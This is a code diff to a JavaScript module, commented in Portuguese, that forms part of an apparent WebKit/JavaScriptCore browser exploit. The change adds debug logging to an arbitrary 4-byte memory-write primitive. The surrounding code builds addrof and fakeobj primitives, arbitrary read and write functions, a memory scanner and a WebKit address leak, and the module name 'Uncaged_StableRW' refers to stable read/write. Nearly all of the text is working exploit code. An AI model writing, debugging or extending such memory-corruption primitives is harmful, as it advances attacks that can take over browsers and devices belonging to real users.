@@ -1,9 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v114 - R74 Correção de Escrita de 4 Bytes)
+// js/script3/testArrayBufferVictimCrash.mjs (v115 - R75 Debugging arb_write_final_func RangeError)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Corrigida a lógica de escrita de 4 bytes em arb_write_final_func para não depender
-//   do high part da leitura atual, eliminando o RangeError no construtor AdvancedInt64.
-// - A lógica agora define o high part como 0 para escritas de 4 bytes.
+// - Adiciona logs detalhados dentro de arb_write_final_func (especificamente para 4-byte writes)
+//   para depurar a origem do RangeError no construtor AdvancedInt64.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -15,7 +14,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v114_R74_Write4ByteFix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v115_R75_DebugWrite4Byte";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -80,9 +79,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             arb_write_final_func = (addr, value, size_bytes = 8) => { 
                 leaker.obj_prop = fakeobj_func(addr);
                 if (size_bytes === 4) {
-                    // CORREÇÃO: Para escrita de 4 bytes, criar AdvancedInt64 com high = 0.
-                    // Isso evita o problema com 'current_val_64.high()' que pode ser NaN/inválido.
-                    const value_to_write_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, 0); 
+                    // DEBUGLOGS AQUI
+                    logS3(`    [arb_write_final_func Debug] value (raw): ${value}, typeof: ${typeof value}`, "debug");
+                    const num_value = Number(value);
+                    logS3(`    [arb_write_final_func Debug] Number(value): ${num_value}, typeof: ${typeof num_value}`, "debug");
+                    const low_part = num_value & 0xFFFFFFFF;
+                    logS3(`    [arb_write_final_func Debug] low_part (value & 0xFFFFFFFF): ${toHex(low_part)}, typeof: ${typeof low_part}`, "debug");
+
+                    const value_to_write_64 = new AdvancedInt64(low_part, 0); 
                     leaker.val_prop = int64ToDouble(value_to_write_64);
                 } else {
                     leaker.val_prop = int64ToDouble(value);
@@ -205,7 +209,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             
             let val_8_bytes = AdvancedInt64.Zero;
             try {
-                // Usar arb_read_final_func diretamente, que já tem a lógica do leaker.
                 val_8_bytes = arb_read_final_func(current_scan_addr, 8); 
                 logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");
 
